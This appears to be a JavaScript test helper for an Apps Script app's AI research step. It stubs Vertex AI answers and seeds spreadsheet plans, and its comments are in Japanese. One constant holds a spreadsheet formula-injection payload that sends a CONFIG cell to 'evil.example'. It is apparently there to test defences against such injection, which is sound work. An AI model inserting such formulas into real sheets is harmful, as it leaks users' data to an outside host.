/**
 * ai-stub.mjs — A-4 AI 調査のテストの共通の道具（テストのファイルではない。app-ai-*.test.mjs・app-vertex-config.test.mjs が読む）。
 * 本物の旧来の A-4（runVertexAIResearch）を、決まった形の Vertex AI の答えで、新アプリの問い合わせの道具（Ai.js）を通して動かす。
 * 計画の見本（seed）・Vertex AI の答え（stubVertex。__ai で出典・失敗・答えを変える）・データ本体の読み方
 */
import assert from 'node:assert/strict';

export const D = (y, m, d = 1) => new Date(y, m - 1, d);
export const TOPICS = ['Market', 'Competitor', 'Channel', 'DX'];
export const EVIL = '=IMAGE("https://evil.example/x?"&CONFIG!B2)';

/** A-4 を動かせる計画の見本（rag: 購入レポート（Vertex AI Search）の設定も入れる） */
export function seed(env, client, fy, { rag = false } = {}) {
  const config = [['項目', '値'], ['[必須] メーカー名（外部集計キー）', client], ['[必須] 予測年度FY（YYYY）', fy], ['[必須] 担当者（カンマ区切り）', '鷹野'],
    ['VERTEX_PROJECT_ID（Google CloudプロジェクトID）', 'test-project'], ['VERTEX_LOCATION（リージョン）', 'asia-northeast1'],
    ['VERTEX_GEMINI_MODEL（grounding/構造化に使うモデル）', 'gemini-test'], ['AI_RESEARCH_ENABLED（0/1）', 1]];
  if (rag) config.push(['VERTEX_DATASTORE_ID', 'ds-test'], ['VERTEX_SEARCH_LOCATION', 'global']);
  return env.seedPlan(env.makeBook(client, {
    CONFIG: { values: config },
    PROCESS_STATUS: { values: [['step_key', 'last_run_date', 'last_run_by', 'status', 'target_client', 'record_count', 'error_summary'],
      ['step1_status', D(2026, 9, 1), 'owner', 'success', client, 10, '']] },
    PRODUCT: { values: [['Person', 'ProductName', 'Month(yyyy/mm/dd)', 'Step(増減率%)', 'Reason']] },
    CLIENT: { values: [['Person', 'Month(yyyy/mm/dd)', 'Step(増減率%)', 'Reason']] },
    OPINIONS: { values: [['Person', 'Month(yyyy/mm/dd)', 'Step(増減率%)', 'Confidence(0..1)', 'Note']] },
    DEV_SPOT: { values: [['Person', 'Month(yyyy/mm/dd)', 'Project', 'Amount(JPY)', 'Confidence(0..1)']] },
  }));
}

/**
 * Vertex AI の答え。__ai で変える: cite（Web の出典を付けるか）・citeTitle（出典を題だけにする）・fail（'web:DX' などの種類と話題 → 番号）・
 * answers（話題 → 形にした答えの上書き）・broken（話題 → 形にした答えを JSON でない文にする）。__calls に問い合わせを残す
 */
export function stubVertex(env) {
  env.run(`(() => {
    ScriptApp.getOAuthToken = () => 'test-token';
    globalThis.__calls = [];
    globalThis.__ai = { cite: true, citeTitle: '', fail: {}, answers: {}, broken: {} };
    const topicOf = (s) => {
      const m = /[Tt]opic: (Market|Competitor|Channel|DX)/.exec(s);
      if (m) return m[1];
      return /市場規模/.test(s) ? 'Market' : /競合 他社/.test(s) ? 'Competitor' : /MR 営業/.test(s) ? 'Channel' : /DX デジタル/.test(s) ? 'DX' : '';
    };
    const base = {
      web: { direction: 'up', impact_score: 80, confidence: 0.8, evidence: '需要が伸びている', time_horizon: '6M', business_relevance_reason: '主な製品に効く' },
      report: { relative_percentile: 70, relative_confidence: 0.6, benchmark_quality: 'medium', peer_universe: '同業', peer_basis: '売上', relative_position_label: '上位',
        relative_reason: '比べて強い', evidence: '比べの根拠' },
      report_text: '市場は伸びている。'
    };
    globalThis.UrlFetchApp = { fetch: (u, o) => {
      const body = JSON.parse(o.payload);
      const kind = /discoveryengine/.test(u) ? 'rag' : (body.generationConfig && body.generationConfig.responseMimeType ? 'struct' : 'web');
      const topic = topicOf(kind === 'rag' ? body.query : JSON.stringify(body.contents));
      __calls.push({ kind: kind, topic: topic, url: u, body: o.payload });
      const code = __ai.fail[kind + ':' + topic] || 0;
      if (code) return { getResponseCode: () => code, getContentText: () => JSON.stringify({ error: { code: code, status: code === 403 ? 'PERMISSION_DENIED' : 'UNAVAILABLE', message: 'test' } }) };
      if (kind === 'rag') {
        return { getResponseCode: () => 200, getContentText: () => JSON.stringify({ summary: { summaryText: 'レポートの要約' },
          results: [{ document: { id: 'doc-1', derivedStructData: { title: 'レポート', link: 'gs://bucket/report.pdf' } } }] }) };
      }
      const answer = Object.assign({}, base, __ai.answers[topic] || {});
      const text = kind === 'struct' ? (__ai.broken[topic] ? '答えが壊れています' : JSON.stringify(answer)) : '市場は伸びている。';
      const chunks = __ai.cite ? [{ web: __ai.citeTitle ? { title: __ai.citeTitle } : { uri: 'https://example.com/a', title: 'a' } }] : [];
      return { getResponseCode: () => 200, getContentText: () => JSON.stringify({ candidates: [{ content: { parts: [{ text: text }] }, groundingMetadata: { groundingChunks: chunks } }],
        usageMetadata: { promptTokenCount: 10, candidatesTokenCount: 20, totalTokenCount: 30 } }) };
    } };
    appAiDeadline_ = (t0) => t0 + 600000;
    appAiWait_ = () => {};
  })()`);
}

export const setAi = (env, code) => env.run(`(() => { ${code} })()`);
export const research = (env, planId) => env.runJob('PLAN.RUN', { planId, action: 'AI.RESEARCH' });
/** データ本体の AI_RESEARCH_STRUCTURED（列 → 元の値。_types も） */
export const structured = (env, planId) => env.call(`appReadPlanTable_('ENG_AI_RESEARCH_STRUCTURED', __p).map(r => {
  const o = { _types: r._types }; APP_ENGINE_SHEETS.AI_RESEARCH_STRUCTURED.header.forEach((h, j) => { o[h] = r._types.charAt(j) === 'f' ? '=' + r[h] : appCellDecode_(r._types.charAt(j), r[h]); });
  return o; })`, { __p: planId });
export const rowOf = (rows, topic, type) => rows.find((r) => r.topic === topic && r.row_type === type);
/** データ本体の AI_RESEARCH（旧来の要約の画面）の ② AI スコアの Final Score（話題 → 点数） */
export function finalScores(env, planId) {
  const v = env.call(`appEngLoadPlanSheets_(__p, ['AI_RESEARCH'], true).AI_RESEARCH.values`, { __p: planId });
  const r = v.findIndex((row) => row[0] === 'Topic' && row[1] === 'Final Score');
  assert.ok(r > 0, '② AI スコアの表がある');
  return Object.fromEntries(v.slice(r + 1, r + 5).map((row) => [row[0], row[1]]));
}
export const step3a = (env, planId) => env.table('ENG_PROCESS_STATUS').find((r) => r.plan_id === planId && r.step_key === 'step3a_status');
export const actions = (env, planId) => env.table('PLAN_ACTIONS').filter((r) => r.plan_id === planId && r.action === 'AI.RESEARCH');
/** その計画の A-4 の組み立ての段が使った回の番号（古い順） */
export const buildActionIds = (env, planId) => env.audit().filter((a) => a.action === 'PLAN.AI.RESEARCH.BUILD' && a.phase === 'END' && a.entity_id === planId)
  .map((a) => JSON.parse(a.after_json).actionId);
/** 手で始めた回数を今日の分から消す（次の日と同じ） */
export const nextDay = (env) => { delete env.props.APP_AI_MANUAL; };
